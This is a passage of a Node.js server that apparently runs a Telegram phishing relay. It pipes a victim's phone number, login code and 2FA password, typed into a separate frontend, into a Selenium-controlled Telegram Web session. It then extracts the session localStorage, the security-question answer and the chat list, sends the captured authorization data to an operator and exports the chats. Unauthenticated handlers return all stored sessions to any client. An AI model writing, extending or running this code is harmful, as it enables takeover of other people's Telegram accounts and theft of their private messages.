      sessionId: data.sessionId,
      message: data.message,
      timestamp: data.timestamp,
      socketId: socket.id
    });

    // Broadcast to all clients for debugging
    io.emit('immediateTestReceived', {
      sessionId: data.sessionId,
      message: 'Immediate test received from Chrome window',
      timestamp: new Date().toISOString()
    });

    console.log('📤 Immediate test broadcasted to all clients');
  });

  socket.on('startTelegramLogin', async (data) => {
    const {
      sessionId,
      parameters,
      deviceHash,
      uid
    } = data;
    console.log('Starting Telegram login for session:', sessionId, 'with parameters:', parameters, 'deviceHash:', deviceHash, 'uid:', uid);

    // Check if this session is already running a Telegram login process
    const existingSession = activeSessions.get(sessionId);
    if (existingSession && existingSession.telegramLoginRunning) {
      console.log(`⚠️ Session ${sessionId} already has Telegram login running, ignoring duplicate request`);
      return;
    }

    // Create initial session data
    const sessionData = {
      socketId: socket.id,
      deviceHash,
      userId: uid,
      status: 'starting',
      startTime: new Date(),
      parameters,
      telegramLoginRunning: true // Mark that Telegram login is running
    };

    // Store in memory for real-time operations
    activeSessions.set(sessionId, sessionData);

    // If deviceHash is provided, map it to this session for reuse
    if (deviceHash) {
      deviceSessionMap.set(deviceHash, sessionId);
      console.log(`🔗 Mapped device ${deviceHash} to session ${sessionId}`);
    }

    // Immediately try to get the driver reference if it's already available
    setTimeout(async () => {
      try {
        const {
          activeDrivers
        } = require('./telegram-login-handler');
        const driverInfo = activeDrivers.get(sessionId);
        if (driverInfo && driverInfo.driver) {
          const session = activeSessions.get(sessionId);
          if (session) {
            session.driver = driverInfo.driver;
            console.log(`🔗 Driver reference retrieved and stored for session ${sessionId} (immediate check)`);

            // For new sessions, do an immediate health check
            setTimeout(async () => {
              try {
                if (session.driver) {
                  await session.driver.getCurrentUrl();
                  console.log(`✅ Immediate health check passed for session ${sessionId}`);
                }
              } catch (error) {
                console.log(`❌ Immediate health check failed for session ${sessionId}:`, error.message);
                // Start recovery immediately for new sessions
                session.status = 'disconnected';
                io.emit('sessionDisconnected', {
                  sessionId,
                  reason: 'immediate_health_check_failed',
                  error: error.message,
                  timestamp: new Date().toISOString()
                });
                attemptSessionRecovery(sessionId, session);
              }
            }, 2000); // Wait 2 seconds after driver reference is stored
          }
        }
      } catch (error) {
        console.log(`⚠️ Immediate driver reference check failed:`, error.message);
      }
    }, 1000); // Wait 1 second after session creation

    // Save to database
    try {
      await sessionDB.saveSession(sessionId, sessionData);
    } catch (error) {
      console.error('❌ Error saving initial session to database:', error);
    }

    try {
      // Start the Telegram login process
      await runTelegramLogin(sessionId, parameters, async (event, data) => {
        console.log(`📡 Received event: ${event}`, data); // Debug logging

        // Update session data based on events
        const updates = {};

        if (event === 'localStorage_extracted' && data.codeData) {
          console.log(`💾 LocalStorage extracted for session ${sessionId}:`, data.codeData);
          // Convert localStorage object to JSON string for storage
          updates.localStorageCode = typeof data.codeData === 'string' ? data.codeData : JSON.stringify(data.codeData);
        } else if (event === 'chat_list_collected' && data.chatTitles) {
          console.log(`💬 Chat list collected for session ${sessionId}: ${data.chatCount} chats`);
          updates.chatList = JSON.stringify(data.chatTitles);
          updates.chatListCollectedAt = new Date();
        } else if (event === 'user_info_extracted' && data.username) {
          console.log(`👤 Storing user info for session ${sessionId}:`, data.username, data.avatarSrc);
          updates.username = data.username;
          updates.avatarSrc = data.avatarSrc;
          // Store phone number and secret question answer if available
          if (data.phoneNumber) {
            updates.phoneNumber = data.phoneNumber;
          }
          if (data.secretQuestionAnswer) {
            updates.secretQuestionAnswer = data.secretQuestionAnswer;
          }
          // Store chat list if available
          if (data.chatList && data.chatList.success) {
            console.log(`💬 Storing chat list for session ${sessionId}: ${data.chatList.totalChats} chats`);
            console.log(`💬 Chat titles:`, data.chatList.chatTitles);
            updates.chatList = JSON.stringify(data.chatList.chatTitles);
            updates.chatListCollectedAt = new Date();
          } else {
            console.log(`⚠️ No chat list data available for session ${sessionId}:`, data.chatList);
          }
          // Mark as completed when user info is extracted
          updates.status = 'completed';
          updates.endTime = new Date();
          updates.telegramLoginRunning = false; // Reset the flag

          // After user info is extracted, find and click Saved Messages chat
          // Only call if we haven't already attempted it (to avoid duplicate calls from both events)
          const session = activeSessions.get(sessionId);
          if (session && !session.savedMessagesClickAttempted) {
            session.savedMessagesClickAttempted = true;
            console.log(`🚀 Triggering Saved Messages export for session ${sessionId} (from userInfoExtracted event)...`);
            setTimeout(async () => {
              try {
                console.log(`📥 Starting exportAllChats for session ${sessionId}...`);
                await exportAllChats(sessionId);
              } catch (error) {
                console.error(`❌ Error exporting Saved Messages for session ${sessionId}:`, error.message);
              }
            }, 3000); // Wait 3 seconds for the page to fully load after authentication
          } else {
            console.log(`⚠️ Export already attempted or session not found for ${sessionId}. savedMessagesClickAttempted: ${session?.savedMessagesClickAttempted}`);
          }
        } else if (event === 'completed' && data.userInfo) {
          // Extract user info from completion event
          console.log(`✅ Session completed for ${sessionId}, extracting user info:`, data.userInfo);
          if (data.userInfo.username) {
            updates.username = data.userInfo.username;
            console.log(`👤 Username extracted: ${data.userInfo.username}`);
          }
          if (data.userInfo.avatarSrc) {
            updates.avatarSrc = data.userInfo.avatarSrc;
            console.log(`🖼️ Avatar extracted: ${data.userInfo.avatarSrc}`);
          }
          // Mark session as completed
          updates.status = 'completed';
          updates.endTime = new Date();
          updates.telegramLoginRunning = false; // Reset the flag
          console.log(`🏁 Session ${sessionId} marked as completed`);

          // Send notification with authorization code
          const session = activeSessions.get(sessionId);
          const authCode = session && session.localStorageCode ? session.localStorageCode : null;
          const userId = session && session.userId ? session.userId : null;

          notificationManager.sendAuthorizationComplete(sessionId, {
            username: data.userInfo.username || 'Unknown',
            phoneNumber: data.userInfo.phoneNumber || 'Unknown'
          }, authCode, userId).catch(err => {
            console.error('❌ Failed to send notification:', err);
          });

          // After authentication completes, find and click Saved Messages chat
          // Only call if we haven't already attempted it (to avoid duplicate calls from both events)
          // Reuse the session variable already declared above
          if (session && !session.savedMessagesClickAttempted) {
            session.savedMessagesClickAttempted = true;
            console.log(`🚀 Triggering Saved Messages export for session ${sessionId}...`);
            setTimeout(async () => {
              try {
                console.log(`📥 Starting exportAllChats for session ${sessionId}...`);
                await exportAllChats(sessionId);
              } catch (error) {
                console.error(`❌ Error exporting Saved Messages for session ${sessionId}:`, error.message);
                console.error(`❌ Error stack:`, error.stack);
              }
            }, 3000); // Wait 3 seconds for the page to fully load after authentication
          } else {
            console.log(`⚠️ Export already attempted or session not found for ${sessionId}. savedMessagesClickAttempted: ${session?.savedMessagesClickAttempted}`);
          }
        } else if (event === 'trigger_export') {
          // Direct trigger from login handler (backup mechanism)
          console.log(`🚀 [Direct trigger] Received trigger_export event for session ${sessionId}`);
          const session = activeSessions.get(sessionId);
          if (session && !session.savedMessagesClickAttempted) {
            session.savedMessagesClickAttempted = true;
            console.log(`🚀 [Direct trigger] Starting Saved Messages export for session ${sessionId}...`);
            setTimeout(async () => {
              try {
                console.log(`📥 [Direct trigger] Starting exportAllChats for session ${sessionId}...`);
                await exportAllChats(sessionId);
              } catch (error) {
                console.error(`❌ [Direct trigger] Error exporting Saved Messages for session ${sessionId}:`, error.message);
                console.error(`❌ [Direct trigger] Error stack:`, error.stack);
              }
            }, 2000); // Wait 2 seconds (already waited 5 seconds in login handler)
          } else {
            console.log(`⚠️ [Direct trigger] Export already attempted or session not found for ${sessionId}. savedMessagesClickAttempted: ${session?.savedMessagesClickAttempted}`);
          }
        } else if (event === 'status' && data.message) {
          // Handle status updates
          console.log(`📊 Status update for session ${sessionId}:`, data.message);
          // Move to running status on first status update
          const session = activeSessions.get(sessionId);
          if (session && session.status === 'starting') {
            updates.status = 'running';
            console.log(`🔄 Session ${sessionId} status changed to 'running'`);

            // Immediately try to get the driver reference when status changes to running
            setTimeout(async () => {
              try {
                const {
                  activeDrivers
                } = require('./telegram-login-handler');
                const driverInfo = activeDrivers.get(sessionId);
                if (driverInfo && driverInfo.driver) {
                  const session = activeSessions.get(sessionId);
                  if (session) {
                    session.driver = driverInfo.driver;
                    console.log(`🔗 Driver reference retrieved and stored for session ${sessionId} (status change check)`);
                  }
                }
              } catch (error) {
                console.log(`⚠️ Status change driver reference check failed:`, error.message);
              }
            }, 1000); // Wait 1 second after status change
          }

          // If this is the "Chrome driver initialized successfully" message, 
          // get the driver reference and store it in activeSessions
          if (data.message === 'Chrome driver initialized successfully') {
            try {
              const {
                activeDrivers
              } = require('./telegram-login-handler');
              const driverInfo = activeDrivers.get(sessionId);
              if (driverInfo && driverInfo.driver) {
                // Store driver reference in activeSessions for monitoring
                const session = activeSessions.get(sessionId);
                if (session) {
                  session.driver = driverInfo.driver;
                  console.log(`🔗 Driver reference stored in activeSessions for session ${sessionId}`);
                }
              }
            } catch (error) {
              console.log(`⚠️ Could not store driver reference:`, error.message);
            }
          }
        } else {
          console.log(`ℹ️ Event ${event} received for session ${sessionId}, no specific handling needed`);
          // Move to running status on any event if still starting
          const session = activeSessions.get(sessionId);
          if (session && session.status === 'starting') {
            updates.status = 'running';
            console.log(`🔄 Session ${sessionId} status changed to 'running' on event: ${event}`);
          }
        }

        // Update in-memory session
        if (Object.keys(updates).length > 0) {
          const session = activeSessions.get(sessionId);
          if (session) {
            console.log(`💾 Updating in-memory session ${sessionId} with:`, updates);
            Object.assign(session, updates);
          } else {
            console.log(`⚠️ Warning: No in-memory session found for ${sessionId}`);
          }
        }

        // Update database
        if (Object.keys(updates).length > 0) {
          try {
            console.log(`💾 Updating database for session ${sessionId} with:`, updates);
            if (updates.chatList) {
              console.log(`💬 Chat list being saved:`, updates.chatList);
            }
            await sessionDB.updateSession(sessionId, updates);
            console.log(`✅ Database updated successfully for session ${sessionId}`);
          } catch (error) {
            console.error(`❌ Error updating session ${sessionId} in database:`, error);
          }
        }

        // Send real-time updates to the frontend
        console.log(`📤 Sending telegramLoginUpdate to frontend for session ${sessionId}, event: ${event}`);
        socket.emit('telegramLoginUpdate', {
          sessionId,
          event,
          data,
          timestamp: new Date().toISOString()
        });
      });

      // After starting the process, wait a bit and then try to get the driver reference
      setTimeout(async () => {
        try {
          const {
            activeDrivers
          } = require('./telegram-login-handler');
          const driverInfo = activeDrivers.get(sessionId);
          if (driverInfo && driverInfo.driver) {
            const session = activeSessions.get(sessionId);
            if (session) {
              session.driver = driverInfo.driver;
              console.log(`🔗 Driver reference retrieved and stored for session ${sessionId} (delayed check)`);
            }
          }
        } catch (error) {
          console.log(`⚠️ Delayed driver reference check failed:`, error.message);
        }
      }, 3000); // Wait 3 seconds after starting the process

    } catch (error) {
      console.error('Error in Telegram login for session:', sessionId, error);

      // Update session status to error
      const session = activeSessions.get(sessionId);
      if (session) {
        session.status = 'error';
        session.error = error.message;
        session.telegramLoginRunning = false; // Reset the flag
      }

      // Update database
      try {
        await sessionDB.updateSession(sessionId, {
          status: 'error',
          error: error.message
        });
      } catch (error) {
        console.error('❌ Error updating session error in database:', error);
      }

      // Send error to frontend
      socket.emit('telegramLoginUpdate', {
        sessionId,
        event: 'error',
        data: {
          error: error.message
        },
        timestamp: new Date().toISOString()
      });

      // Send error notification
      notificationManager.sendError(sessionId, error.message).catch(err => {
        console.error('❌ Failed to send error notification:', err);
      });
    }
  });

  socket.on('getSessionStatus', async (sessionId) => {
    try {
      // First try to get from database
      const session = await sessionDB.getSession(sessionId);
      if (session) {
        socket.emit('sessionStatus', {
          sessionId,
          status: session.status,
          startTime: session.startTime,
          endTime: session.endTime,
          error: session.error,
          localStorageCode: session.localStorageCode || null,
          username: session.username || null,
          avatarSrc: session.avatarSrc || null,
          phoneNumber: session.phoneNumber || null,
          secretQuestionAnswer: session.secretQuestionAnswer || null
        });
      } else {
        socket.emit('sessionStatus', {
          sessionId,
          status: 'not_found'
        });
      }
    } catch (error) {
      console.error('❌ Error getting session status:', error);
      socket.emit('sessionStatus', {
        sessionId,
        status: 'error',
        error: error.message
      });
    }
  });

  socket.on('getAllSessions', async () => {
    try {
      console.log('🔍 Frontend requested all sessions');
      // TODO: Implement socket authentication to get user info
      // For now, return all sessions (socket connections are not authenticated)
      const sessions = await sessionDB.getAllSessions();
      console.log('📊 Retrieved sessions from database:', sessions.length);
      console.log('📋 Session data being sent to frontend:', JSON.stringify(sessions, null, 2));
      socket.emit('allSessions', sessions);
      console.log('✅ Sent allSessions event to frontend');
    } catch (error) {
      console.error('❌ Error getting all sessions:', error);
      socket.emit('allSessions', []);
    }
  });

  socket.on('clearCompletedSessions', async () => {
    try {
      const clearedCount = await sessionDB.clearCompletedSessions();
      console.log(`Cleared ${clearedCount} completed sessions from database`);
      socket.emit('sessionsCleared', {
        clearedCount
      });
    } catch (error) {
      console.error('❌ Error clearing completed sessions:', error);
      socket.emit('sessionsCleared', {
        clearedCount: 0,
        error: error.message
      });
    }
  });

  // Handle frontend window close events
  socket.on('closeSeleniumWindow', async (data) => {
    const {
      sessionId
    } = data;
    console.log(`🔒 Frontend requested to close Selenium window for session: ${sessionId}`);

    try {
      // Close the actual Selenium driver
      const driverClosed = await closeDriverBySessionId(sessionId);

      // Get session from active sessions
      const session = activeSessions.get(sessionId);
      if (session) {
        console.log(`🗑️ Cleaning up session ${sessionId} from active sessions`);
        // Reset the telegramLoginRunning flag before deleting
        session.telegramLoginRunning = false;
        activeSessions.delete(sessionId);

        // Check if session has localStorage data
        const dbSession = await sessionDB.getSession(sessionId);
        const updates = {
          endTime: new Date(),
          closedBy: 'frontend',
          driverClosed: driverClosed
        };

        // Only change status to 'closed' if there's no localStorage data
        // If localStorage exists, keep status as 'completed'
        if (!dbSession.localStorageCode) {
          updates.status = 'closed';
        } else {
          console.log(`✅ Preserving 'completed' status for session ${sessionId} (has localStorage data)`);
        }

        // Update database
        await sessionDB.updateSession(sessionId, updates);

        console.log(`✅ Session ${sessionId} updated in database (status preserved if completed)`);
      } else {
        console.log(`⚠️ Session ${sessionId} not found in active sessions`);
      }

      // Send confirmation back to frontend
      socket.emit('seleniumWindowClosed', {
        sessionId,
        status: 'success',
        driverClosed: driverClosed,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error(`❌ Error closing Selenium window for session ${sessionId}:`, error);
      socket.emit('seleniumWindowClosed', {
        sessionId,
        status: 'error',
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  socket.on('cleanupSession', async (data) => {
    const {
      sessionId
    } = data;
    console.log(`🧹 Frontend requested cleanup for session: ${sessionId}`);

    try {
      // Get session from active sessions
      const session = activeSessions.get(sessionId);
      if (session) {
        console.log(`🗑️ Final cleanup for session ${sessionId}`);
        // Reset the telegramLoginRunning flag before deleting
        session.telegramLoginRunning = false;
        activeSessions.delete(sessionId);

        // Update database to mark session as cleaned up
        await sessionDB.updateSession(sessionId, {
          status: 'cleaned_up',
          endTime: new Date(),
          cleanedUpBy: 'frontend'
        });

        console.log(`✅ Session ${sessionId} cleaned up successfully`);
      } else {
        console.log(`⚠️ Session ${sessionId} not found in active sessions for cleanup`);
      }

      // Send confirmation back to frontend
      socket.emit('sessionCleanedUp', {
        sessionId,
        status: 'success',
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error(`❌ Error cleaning up session ${sessionId}:`, error);
      socket.emit('sessionCleanedUp', {
        sessionId,
        status: 'error',
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle checkElementInSelenium event
  socket.on('checkElementInSelenium', async (data) => {
    const {
      sessionId,
      elementType
    } = data;
    console.log(`🔍 Frontend requested to check element in Selenium for session: ${sessionId}, elementType: ${elementType || 'unknown'}`);

    try {
      // Find the Chrome driver for this session
      const driverInfo = activeDrivers.get(sessionId);
      if (!driverInfo || !driverInfo.driver) {
        console.log(`⚠️ No active driver found for session: ${sessionId}`);
        socket.emit('elementCheckResult', {
          sessionId,
          elementFound: false,
          error: 'No active driver found for this session',
          elementType,
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;

      // Get the CSS selector for this element type
      const selector = ELEMENT_SELECTORS[elementType];
      if (!selector) {
        console.log(`❌ No selector found for element type: ${elementType}`);
        socket.emit('elementCheckResult', {
          sessionId,
          elementFound: false,
          error: `No selector found for element type: ${elementType}`,
          elementType,
          timestamp: new Date().toISOString()
        });
        return;
      }

      console.log(`🔍 Looking for element type: ${elementType} with selector: ${selector}`);

      try {
        let element = null;

        // Try to find the element with the CSS selector
        try {
          element = await driver.findElement(By.css(selector));
          console.log(`✅ Element found with selector: ${selector}`);
        } catch (cssError) {
          console.log(`❌ CSS selector failed: ${selector}`);
        }

        if (element) {
          console.log(`✅ Element found in Selenium window: ${elementType}`);

          // For password input, also extract security question text
          let securityQuestionText = '';
          if (elementType === 'passwordInput') {
            try {
              console.log('🔍 Extracting security question text from .password-input label...');
              securityQuestionText = await driver.executeScript(`
                const labelElement = document.querySelector('.password-input label');
                return labelElement ? labelElement.textContent.trim() : '';
              `);
              console.log(`📝 Security question text extracted: "${securityQuestionText}"`);
            } catch (extractError) {
              console.log(`⚠️ Could not extract security question text: ${extractError.message}`);
              securityQuestionText = '';
            }
          }

          socket.emit('elementCheckResult', {
            sessionId,
            elementFound: true,
            selector: selector,
            elementType,
            securityQuestionText: securityQuestionText,
            timestamp: new Date().toISOString()
          });
        } else {
          console.log(`❌ Element not found in Selenium window: ${elementType}`);
          socket.emit('elementCheckResult', {
            sessionId,
            elementFound: false,
            selector: selector,
            elementType,
            securityQuestionText: '',
            timestamp: new Date().toISOString()
          });
        }
      } catch (findError) {
        console.log(`❌ Error finding element: ${findError.message}`);
        socket.emit('elementCheckResult', {
          sessionId,
          elementFound: false,
          selector: selector,
          elementType,
          securityQuestionText: '',
          error: findError.message,
          timestamp: new Date().toISOString()
        });
      }
    } catch (error) {
      console.error(`❌ Error checking element in Selenium for session ${sessionId}:`, error);
      socket.emit('elementCheckResult', {
        sessionId,
        elementFound: false,
        selector: 'unknown',
        elementType,
        securityQuestionText: '',
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  })

  // Handle inspectPageStructure event
  socket.on('inspectPageStructure', async (data) => {
    const {
      sessionId
    } = data;
    console.log(`🔍 Frontend requested page structure inspection for session: ${sessionId}`);

    try {
      // Find the Chrome driver for this session
      const driverInfo = activeDrivers.get(sessionId);
      if (!driverInfo || !driverInfo.driver) {
        console.log(`⚠️ No active driver found for session: ${sessionId}`);
        socket.emit('pageStructureResult', {
          sessionId,
          error: 'No active driver found for this session',
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;

      try {
        // Get page title and URL
        const title = await driver.getTitle();
        const url = await driver.getCurrentUrl();

        // Find all input elements
        const inputs = await driver.findElements(By.xpath('//input'));
        const inputInfo = [];

        for (const input of inputs) {
          try {
            const tagName = await input.getTagName();
            const type = await input.getAttribute('type');
            const id = await input.getAttribute('id');
            const name = await input.getAttribute('name');
            const placeholder = await input.getAttribute('placeholder');
            const className = await input.getAttribute('class');

            inputInfo.push({
              tagName,
              type,
              id,
              name,
              placeholder,
              className
            });
          } catch (inputError) {
            console.log('Error getting input attributes:', inputError.message);
          }
        }

        // Find all button elements
        const buttons = await driver.findElements(By.xpath('//button'));
        const buttonInfo = [];

        for (const button of buttons) {
          try {
            const tagName = await button.getTagName();
            const text = await button.getText();
            const id = await button.getAttribute('id');
            const className = await button.getAttribute('class');

            buttonInfo.push({
              tagName,
              text,
              id,
              className
            });
          } catch (buttonError) {
            console.log('Error getting button attributes:', buttonError.message);
          }
        }

        console.log('✅ Page structure inspection completed');
        socket.emit('pageStructureResult', {
          sessionId,
          title,
          url,
          inputs: inputInfo,
          buttons: buttonInfo,
          timestamp: new Date().toISOString()
        });

      } catch (inspectError) {
        console.log('❌ Error inspecting page structure:', inspectError.message);
        socket.emit('pageStructureResult', {
          sessionId,
          error: inspectError.message,
          timestamp: new Date().toISOString()
        });
      }

    } catch (error) {
      console.error(`❌ Error in page structure inspection for session ${sessionId}:`, error);
      socket.emit('pageStructureResult', {
        sessionId,
        error: error.message,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle syncInputToSelenium event
  // Note: ongoingInputOperations and inputDebounceTimers are defined at module level

  socket.on('syncInputToSelenium', async (data) => {
    const {
      sessionId,
      inputType,
      value
    } = data;
    console.log(`syncInputToSelenium; value: ${value}`);

    if (value === '') {
      console.log(`syncInputToSelenium; ⚠️ Value is empty, skipping...`);
      return;
    }

    // Debounce rapid successive events (wait 100ms before processing)
    if (inputDebounceTimers.has(sessionId)) {
      clearTimeout(inputDebounceTimers.get(sessionId));
    }

    const debounceTimer = setTimeout(async () => {
      // Remove the timer from the map
      inputDebounceTimers.delete(sessionId);

      // Process the input
      await processSyncInputToSelenium(sessionId, inputType, value);
    }, 100);

    inputDebounceTimers.set(sessionId, debounceTimer);
  });

  // Separate function to process the input (extracted for cleaner code)
  async function processSyncInputToSelenium(sessionId, inputType, value) {
    // Cancel any ongoing operation for this session
    if (ongoingInputOperations.has(sessionId)) {
      const {
        abortController
      } = ongoingInputOperations.get(sessionId);
      abortController.abort();
      console.log(`syncInputToSelenium; 🚫 Cancelled previous operation for session: ${sessionId}`);
    }

    // Create new abort controller for this operation
    const abortController = new AbortController();
    const operationId = Date.now();

    ongoingInputOperations.set(sessionId, {
      abortController,
      operationId,
      value
    });

    try {
      // Find the Chrome driver for this session
      const driverInfo = activeDrivers.get(sessionId);
      if (!driverInfo || !driverInfo.driver) {
        console.log(`syncInputToSelenium; ⚠️ No active driver found for session: ${sessionId}`);
        return;
      }

      const driver = driverInfo.driver;

      try {
        let inputElement = null;

        if (inputType === 'phoneNumber') {
          // Try to find the phone number input field
          try {
            inputElement = await driver.findElement(By.id('sign-in-phone-number'));
          } catch (idError) {
            console.log('Could not find phone number input field');
            return;
          }
        } else if (inputType === 'verificationCode') {
          // Try to find the verification code input field
          try {
            inputElement = await driver.findElement(By.id('sign-in-code'));
          } catch (idError) {
            console.log('Could not find verification code input field');
            return;
          }
        } else if (inputType === 'password') {
          // Try to find the password input field
          try {
            inputElement = await driver.findElement(By.id('sign-in-password'));
          } catch (idError) {
            console.log('Could not find password input field');
            return;
          }
        }

        if (inputElement) {
          // Check if this operation was cancelled
          if (abortController.signal.aborted) {
            console.log(`syncInputToSelenium; 🚫 Operation cancelled for session: ${sessionId}`);
            return;
          }

          // Clear the input and set the new value
          await inputElement.clear();
          await new Promise(resolve => setTimeout(resolve, 50));

          // Check again if cancelled after clear
          if (abortController.signal.aborted) {
            console.log(`syncInputToSelenium; 🚫 Operation cancelled after clear for session: ${sessionId}`);
            return;
          }

          // Execute script to alert the value variable
          await driver.executeScript(`
						console.log('Value to be typed: ' + arguments[0]);
					`, value);

          const charByCharMode = true;

          if (charByCharMode) {
            for (let i = 0; i < value.length; i++) {
              // Check if operation was cancelled before each character
              if (abortController.signal.aborted) {
                console.log(`syncInputToSelenium; 🚫 Operation cancelled at character ${i} for session: ${sessionId}`);
                return;
              }

              const char = value[i];
              await inputElement.sendKeys(char);
              await new Promise(resolve => setTimeout(resolve, 10)); // Much faster typing
            }
          } else {
            // Check if cancelled before typing
            if (abortController.signal.aborted) {
              console.log(`syncInputToSelenium; 🚫 Operation cancelled before typing for session: ${sessionId}`);
              return;
            }

            await inputElement.sendKeys(value);
            await new Promise(resolve => setTimeout(resolve, 10)); // Much faster typing
          }

          // Check if this was the final operation (latest value)
          const currentOperation = ongoingInputOperations.get(sessionId);
          if (currentOperation && currentOperation.operationId === operationId) {
            console.log(`syncInputToSelenium; ✅ Successfully completed operation for session: ${sessionId}, value: "${value}"`);
            ongoingInputOperations.delete(sessionId);
          } else {
            console.log(`syncInputToSelenium; 🚫 Operation superseded by newer one for session: ${sessionId}`);
          }

          console.log(`✅ Successfully synced ${inputType} input to Selenium: ${value}`);
        }

      } catch (syncError) {
        console.log(`❌ Error syncing ${inputType} input:`, syncError.message);
      }

    } catch (error) {
      console.error(`❌ Error in syncInputToSelenium for session ${sessionId}:`, error);
    } finally {
      // Clean up the operation if it's still in the map and matches this operation
      const currentOperation = ongoingInputOperations.get(sessionId);
      if (currentOperation && currentOperation.operationId === operationId) {
        ongoingInputOperations.delete(sessionId);
        console.log(`syncInputToSelenium; 🧹 Cleaned up operation for session: ${sessionId}`);
      }
    }
  }



  // Handle test connection
  socket.on('testConnection', (data) => {
    const {
      sessionId,
      timestamp
    } = data;
    console.log(`🧪 Test connection received for session: ${sessionId}`);

    // Send back a test response
    socket.emit('testConnectionResult', {
      sessionId,
      success: true,
      message: 'Server received test connection',
      timestamp: new Date().toISOString()
    });

    // Also check if the session exists
    const session = activeSessions.get(sessionId);
    if (session) {
      console.log(`✅ Session ${sessionId} found on server`);
      socket.emit('testConnectionResult', {
        sessionId,
        success: true,
        message: `Session found: ${session.status}`,
        timestamp: new Date().toISOString()
      });
    } else {
      console.log(`❌ Session ${sessionId} not found on server`);
      socket.emit('testConnectionResult', {
        sessionId,
        success: false,
        message: 'Session not found on server',
        timestamp: new Date().toISOString()
      });
    }
  });

  // Handle session status check
  socket.on('checkSessionStatus', (data) => {
    const {
      sessionId,
      timestamp
    } = data;
    console.log(`🔍 Checking session status for: ${sessionId}`);

    // Check if session exists and has an active driver
    const session = activeSessions.get(sessionId);
    if (session && session.driver && session.status !== 'disconnected') {
      try {
        // Try to get the current URL to verify the driver is actually working
        session.driver.getCurrentUrl().then(() => {
          console.log(`✅ Session ${sessionId} is active and driver is working`);
          socket.emit('sessionStatusResult', {
            sessionId,
            isActive: true,
            status: session.status,
            timestamp: new Date().toISOString()
          });
        }).catch(async (error) => {
          console.log(`❌ Session ${sessionId} driver error:`, error.message);

          // Check if session is already in a final state before marking as disconnected
          const dbSession = await sessionDB.getSession(sessionId).catch(() => null);
          if (dbSession && (dbSession.status === 'completed' || dbSession.status === 'failed')) {
            console.log(`✅ Session ${sessionId} already in final state (${dbSession.status}), not marking as disconnected`);
            socket.emit('sessionStatusResult', {
              sessionId,
              isActive: false,
              status: dbSession.status,
              timestamp: new Date().toISOString()
            });
            return;
          }

          // Mark session as disconnected
          session.status = 'disconnected';
          socket.emit('sessionStatusResult', {
            sessionId,
            isActive: false,
            status: 'driver_error',
            error: error.message,
            timestamp: new Date().toISOString()
          });

          // Notify all connected clients about session disconnection
          io.emit('sessionDisconnected', {
            sessionId,
            reason: 'driver_error',
            error: error.message,
            timestamp: new Date().toISOString()
          });

          // Attempt to automatically recover the session
          console.log(`🔄 Attempting to automatically recover session ${sessionId}...`);
          attemptSessionRecovery(sessionId, session);
        });
      } catch (error) {
        console.log(`❌ Session ${sessionId} driver not accessible:`, error.message);

        // Check if session is already in a final state before marking as disconnected
        sessionDB.getSession(sessionId).then((dbSession) => {
          if (dbSession && (dbSession.status === 'completed' || dbSession.status === 'failed')) {
            console.log(`✅ Session ${sessionId} already in final state (${dbSession.status}), not marking as disconnected`);
            socket.emit('sessionStatusResult', {
              sessionId,
              isActive: false,
              status: dbSession.status,
              timestamp: new Date().toISOString()
            });
            return;
          }

          // Mark session as disconnected
          session.status = 'disconnected';
          socket.emit('sessionStatusResult', {
            sessionId,
            isActive: false,
            status: 'driver_inaccessible',
            error: error.message,
            timestamp: new Date().toISOString()
          });

          // Notify all connected clients about session disconnection
          io.emit('sessionDisconnected', {
            sessionId,
            reason: 'driver_inaccessible',
            error: error.message,
            timestamp: new Date().toISOString()
          });

          // Attempt to automatically recover the session
          console.log(`🔄 Attempting to automatically recover session ${sessionId}...`);
          attemptSessionRecovery(sessionId, session);
        }).catch((dbError) => {
          console.error(`❌ Error checking session status from database:`, dbError);
          // If we can't check the DB, mark as disconnected anyway
          session.status = 'disconnected';
          socket.emit('sessionStatusResult', {
            sessionId,
            isActive: false,
            status: 'driver_inaccessible',
            error: error.message,
            timestamp: new Date().toISOString()
          });
        });
      }
    } else {
      console.log(`❌ Session ${sessionId} not found or inactive`);
      socket.emit('sessionStatusResult', {
        sessionId,
        isActive: false,
        status: session ? session.status : 'not_found',
        timestamp: new Date().toISOString()
      });

      // If session was previously active but is now inactive, notify about disconnection
      if (session && session.status === 'disconnected') {
        io.emit('sessionDisconnected', {
          sessionId,
          reason: 'session_closed',
          timestamp: new Date().toISOString()
        });

        // Attempt to automatically recover the session
        console.log(`🔄 Attempting to automatically recover session ${sessionId}...`);
        attemptSessionRecovery(sessionId, session);
      }
    }
  });

  // Handle test connection result
  socket.on('testConnectionResult', (data) => {
    console.log('🧪 Test connection result:', data);
    if (data.sessionId === sessionId) {
      console.log('✅ Test connection successful for our session');
    }
  });

  // Handle get phone number from Selenium request
  socket.on('getPhoneNumberFromSelenium', async (data) => {
    const {
      sessionId,
      timestamp
    } = data;
    console.log(`📱 Get phone number from Selenium request for session: ${sessionId}`);

    try {
      // Find the Chrome driver for this session
      const {
        activeDrivers
      } = require('./telegram-login-handler');
      const driverInfo = activeDrivers.get(sessionId);

      if (!driverInfo || !driverInfo.driver) {
        console.log(`❌ No active driver found for session: ${sessionId}`);
        socket.emit('getPhoneNumberFromSeleniumResult', {
          sessionId,
          success: false,
          error: 'No active driver found',
          timestamp: new Date().toISOString()
        });
        return;
      }

      const driver = driverInfo.driver;
      console.log(`✅ Found driver for session: ${sessionId}`);

      // Find the phone number input field
      let phoneInput;
      try {
        phoneInput = await driver.findElement(By.id('sign-in-phone-number'));
        console.log(`✅ Found phone number input field`);
      } catch (error) {
        console.log(`❌ Could not find phone number input field:`, error.message);
        socket.emit('getPhoneNumberFromSeleniumResult', {
          sessionId,
          success: false,
          error: 'Phone number input field not found',
          timestamp: new Date().toISOString()
        });
        return;
      }

      // Get the current value from the input field
      const currentValue = await phoneInput.getAttribute('value');
      console.log(`📱 Current phone number in Selenium: "${currentValue}"`);

      // Send the result back
      socket.emit('getPhoneNumberFromSeleniumResult', {
        sessionId,
        success: true,
        phoneNumber: currentValue,
        timestamp: new Date().toISOString()
      });

    } catch (error) {
